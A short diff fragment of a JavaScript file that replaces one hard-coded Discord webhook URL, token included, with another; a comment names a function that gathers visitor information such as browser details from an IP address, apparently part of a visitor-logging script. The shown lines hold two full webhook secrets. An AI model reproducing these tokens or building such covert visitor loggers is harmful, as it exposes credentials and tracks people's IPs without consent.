@@ -1,5 +1,5 @@
 // Replace with your Discord Webhook URL
-const webhookURL = "https://discord.com/api/webhooks/1282331828929167503/-1AoaCA6arGCsuG-oAhRY3ZmCK6zrBnIejuRFHLrNRXgMT5koI256rXAd5Bq7XBeHNqU";
+const webhookURL = "https://discord.com/api/webhooks/1282365468946202705/LvCXmBLEUsAOviiLpimjrEH9ohjDHT_bF8BEU6MLotEPNRuXOd8Hepum1h8RjGHDrz3j";
 
 // Function to get user information (like browser details)
 function getUserInfo(ip) {
